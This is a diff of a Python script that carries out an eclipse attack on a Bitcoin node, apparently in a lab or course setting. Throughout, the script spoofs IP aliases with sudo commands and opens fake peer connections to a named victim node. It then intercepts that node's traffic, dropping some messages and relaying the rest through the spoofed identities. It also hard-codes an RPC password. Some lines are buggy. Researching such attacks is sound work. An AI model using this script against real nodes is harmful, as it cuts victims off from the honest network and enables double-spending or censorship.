@@ -8,6 +8,8 @@ import time
 import bitcoin
 from bitcoin.messages import *
 from bitcoin.net import CAddress
+from io import BytesIO as _BytesIO
+import hashlib
 
 import fcntl
 import struct 
@@ -22,9 +24,9 @@ victim_port = 8333
 
 attacker_ip = '10.0.2.15'
 
-spoof_IP_interface = [] # Keeps the IP alias interface and IP for each successful connection
-spoof_IP_and_ports = [] # Keeps the IP and port for each successful connection
-spoof_IP_sockets = [] # Keeps the socket for each successful connection
+identity_interface = [] # Keeps the IP alias interface and IP for each successful connection
+identity_address = [] # Keeps the IP and port for each successful connection
+identity_socket = [] # Keeps the socket for each successful connection
 
 # The file where the iptables backup is saved, then restored when the script ends
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
@@ -37,26 +39,7 @@ def terminal(cmd):
 def bitcoin(cmd):
 	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()
 
-# Get the network interface of the default gateway
-def get_interface():
-	m = re.search(r'\n_gateway +[^ ]+ +[^ ]+ +[^ ]+ +([^ ]+)\n', terminal('arp'))
-	if m != None:
-		return m.group(1)
-	else:
-		print('Error: Network interface couldn\'t be found.')
-		sys.exit()
-
-# Get the broadcast address of the network interface
-# Used as an IP template of what can change, so that packets still come back to the sender
-def get_broadcast_address():
-	m = re.search(r'broadcast ([^ ]+)', terminal(f'ifconfig {network_interface}'))
-	if m != None:
-		return m.group(1)
-	else:
-		print('Error: Network broadcast IP couldn\'t be found.')
-		sys.exit()
-
-# Generate a random identity using the broadcast address
+# Generate a random identity using the broadcast address template
 def random_ip():
 	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
 	ip = broadcast_address
@@ -77,7 +60,7 @@ def ip_alias(ip_address):
 
 # Construct a version packet using python-bitcoinlib
 def version_packet(src_ip, dst_ip, src_port, dst_port):
-	msg = msg_version()
+	msg = msg_version(bitcoin_protocolversion)
 	msg.nVersion = bitcoin_protocolversion
 	msg.addrFrom.ip = src_ip
 	msg.addrFrom.port = src_port
@@ -89,16 +72,16 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 
 # Close a connection
 def close_connection(index):
-	if index < 0 and index >= len(spoof_IP_sockets):
+	if index < 0 and index >= len(identity_socket):
 		print('Error: Failed to close connection')
 		return
-	ip, port = spoof_IP_and_ports[index]
-	interface = spoof_IP_interface[index][0]
-	socket = spoof_IP_sockets[index]
+	ip, port = identity_address[index]
+	interface = identity_interface[index]
+	socket = identity_socket[index]
 
-	del spoof_IP_and_ports[index]
-	del spoof_IP_sockets[index]
-	del spoof_IP_interface[index]
+	del identity_address[index]
+	del identity_socket[index]
+	del identity_interface[index]
 
 	socket.close()
 	terminal(f'sudo ifconfig {interface} {ip} down')
@@ -112,7 +95,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
 
 	spoof_interface = ip_alias(src_ip)
-	spoof_IP_interface.append((spoof_interface, src_ip))
+	identity_interface.append(spoof_interface)
 	if verbose: print(f'Successfully set up IP alias on interface {spoof_interface}')
 	if verbose: print('Resulting ifconfig interface:')
 	if verbose: print(terminal(f'ifconfig {spoof_interface}').rstrip() + '\n')
@@ -148,7 +131,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	
 	# Send verack packet
 	if verbose: print('\nSending VERACK packet')
-	verack = msg_verack()
+	verack = msg_verack(bitcoin_protocolversion)
 	if verbose: print(verack)
 	s.send(verack.to_bytes())
 
@@ -159,8 +142,8 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	if verbose: print('\n\n')
 	if verbose: print('* CONNECTION SUCCESSFULLY ESTABLISHED *')
 
-	spoof_IP_and_ports.append((src_ip, src_port))
-	spoof_IP_sockets.append(s)
+	identity_address.append((src_ip, src_port))
+	identity_socket.append(s)
 
 	# Listen to the connections for future packets
 	if verbose: print('Attaching packet listener for future messages...')
@@ -176,49 +159,46 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 
 # Called when a packet is sniffed from the network
 def packet_received(packet):
-	try:
-		magic_number = packet.load[0:4]
-		if magic_number != b'\xf9\xbe\xb4\xd9':
-			return # Only allow Bitcoin messages (by verifying the global magic number)
-	except:
-		return
 
+	msg_raw = bytes(packet)
+	is_bitcoin = msg_raw[0:4] == b'\xf9\xbe\xb4\xd9'
+	msg_type = msg_raw[4:4+12].split(b"\x00", 1)[0].decode()
+	payload_length = struct.unpack(b'<i', msg_raw[4+12:4+12+4])[0]
+	payload_valid = msg_raw[4+12+4:4+12+4+4] == hashlib.sha256(hashlib.sha256(msg_raw[4+12+4+4:4+12+4+4+payload_length]).digest()).digest()[:4]
+	payload_length_valid = len(msg_raw) - payload_length == 4+12+4+4
+	#msg_payload = b''
+	#if(payload_valid and payload_length_valid):
+	#	msg_payload = msg_raw[4+12+4+4:4+12+4+4+payload_length]
 
-	# Extract the message type
-	msgtype = packet.load[4:4+12].split(b"\x00", 1)[0].decode()
+	if not is_bitcoin: return
+	if not payload_valid: return
+	if not payload_length_valid: return
 
-	#msglen = struct.unpack(b"<i", recvbuf[4+12:4+12+4])[0]
-	#parameters_raw = recvbuf[4+12+4+4:4+12+4+4+msglen]
-	#parameters = {}
-	#checksum = recvbuf[4+12+4:4+12+4+4] # Equal to sha256(sha256(parameters))[0:4]
+	# Parse the message payload
+	msg = MsgSerializable.from_bytes(msg_raw)
 
 	# Relay Bitcoin packets that aren't from the victim
 	if packet[IP].src == victim_ip:
-		print(f'*** Message received ** addr={packet[IP].dst} ** cmd={msgtype}')
+		print(f'*** Message received ** addr={packet[IP].dst} ** cmd={msg_type}')
 
-		if msgtype == 'ping':
-			payload = packet[TCP].payload
-			#msg = MsgSerializable.from_bytes(bytes(payload))
-			print(bytes(payload))
-			msg = MsgSerializable.from_bytes(bytes(payload))
-			print(msg)
-			print(type(msg))
-			# send pong
+		if msg_type == 'ping':
+			pong = msg_pong(bitcoin_protocolversion)
+			pong.nonce = msg.nonce
 
 	elif packet[IP].dst == attacker_ip:
-		if len(spoof_IP_sockets) > 0:
+		if len(identity_socket) > 0:
 			if random.random() > eclipse_packet_drop_rate:
-				rand_i = random.randint(0, len(spoof_IP_sockets) - 1)
-				rand_ip = spoof_IP_and_ports[rand_i][0]
-				rand_port = spoof_IP_and_ports[rand_i][1]
-				rand_socket = spoof_IP_sockets[rand_i]
+				rand_i = random.randint(0, len(identity_socket) - 1)
+				rand_ip = identity_address[rand_i][0]
+				rand_port = identity_address[rand_i][1]
+				rand_socket = identity_socket[rand_i]
 
-				print(f'*** Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
+				print(f'*** Relaying {msg_type} from {packet[IP].src} to {rand_ip}:{rand_port}')
 				#packet[IP].src = rand_ip
 				#packet[IP].dst = victim_ip
 
 				try:
-					#custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
+					#custom = custom_packet(msg_type, rand_ip, victim_ip, rand_port, victim_port)
 					#if custom is not None:
 					#	rand_socket.send(custom.to_bytes())
 
@@ -240,11 +220,28 @@ def packet_received(packet):
 
 
 def initialize_network_info():
+	print('Retrieving network info...')
 	global network_interface, broadcast_address
-	network_interface = get_interface().strip()
-	broadcast_address = get_broadcast_address().strip()
+
+	# Get the network interface of the default gateway
+	m = re.search(r'\n_gateway +[^ ]+ +[^ ]+ +[^ ]+ +([^ ]+)\n', terminal('arp'))
+	if m != None:
+		network_interface = m.group(1).strip()
+	else:
+		print('Error: Network interface couldn\'t be found.')
+		sys.exit()
+
+	# Get the broadcast address of the network interface
+	# Used as an IP template of what can change, so that packets still come back to the sender
+	m = re.search(r'broadcast ([^ ]+)', terminal(f'ifconfig {network_interface}'))
+	if m != None:
+		broadcast_address = m.group(1).strip()
+	else:
+		print('Error: Network broadcast IP couldn\'t be found.')
+		sys.exit()
 
 def initialize_bitcoin_info():
+	print('Retrieving bitcoin info...')
 	global bitcoin_subversion
 	global bitcoin_protocolversion
 	bitcoin_subversion = '/Satoshi:0.18.0/'
@@ -271,14 +268,16 @@ def cleanup_iptables():
 
 # Remove all ip aliases that were created by the script
 def cleanup_ipaliases():
-	for interface, ip in spoof_IP_interface:
+	for i in range(identity_interface):
+		ip = identity_address[i][0]
+		interface = identity_interface[i]
 		print(f'Cleaning up IP alias {ip} on {interface}')
 		terminal(f'sudo ifconfig {interface} {ip} down')
 
 # This function is ran when the script is stopped
 def on_close():
 	print('Closing open sockets')
-	for socket in spoof_IP_sockets:
+	for socket in identity_socket:
 		socket.close()
 	cleanup_ipaliases()
 	cleanup_iptables()
@@ -304,7 +303,7 @@ if __name__ == '__main__':
 		except ConnectionRefusedError:
 			print('Connection was refused. The victim\'s node must not be running.')
 
-	print(f'Successful connections: {len(spoof_IP_and_ports)}\n')
+	print(f'Successful connections: {len(identity_address)}\n')
 
 	# Prevent the script from terminating when the sniff function is still active
 	while 1:
